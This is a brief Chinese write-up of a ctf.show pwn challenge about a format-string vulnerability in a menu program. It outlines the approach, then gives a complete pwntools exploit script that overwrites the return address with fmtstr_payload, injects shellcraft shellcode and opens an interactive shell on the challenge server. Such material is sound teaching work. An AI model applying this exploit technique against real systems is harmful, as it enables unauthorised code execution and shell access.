# 挑战简介
多种姿势

# 思路
很基础的一道题，考了格式化字符串  

3个选项 
- 第一个选项：展示栈的位置，并允许你向栈内输入数据
- 第二个选项：输出栈内数据，格式化字符串主要输出点
- 第三个选项：退出，并执行返回语法

思路很清晰了，先选第一个选项，再找出输入数据的栈位置，找出偏移量，覆盖返回函数，从而返回执行写入的后门函数即可  

```
from pwn import *
from LibcSearcher import *
#context(arch = "amd64",os = 'linux',log_level = 'debug')

context(arch = "i386",os = 'linux',log_level = 'debug')

#io = process("./pwn")

io = remote('pwn.challenge.ctf.show',28242)

elf = ELF('D:\edge 下载\pwn')

io.sendlineafter(b"Quit!!!\n" , '1')

stack = int(io.recvuntil('\n'),16)

ret = stack + 0x41c

payload = fmtstr_payload(16, {ret:stack})

io.sendline(payload)    
io.sendlineafter("Quit!!!\n" , '2')

io.sendlineafter("Quit!!!\n" , '1')

io.sendline(asm(shellcraft.sh()))

io.sendlineafter("Quit!!!\n" , '3')

io.interactive()
```
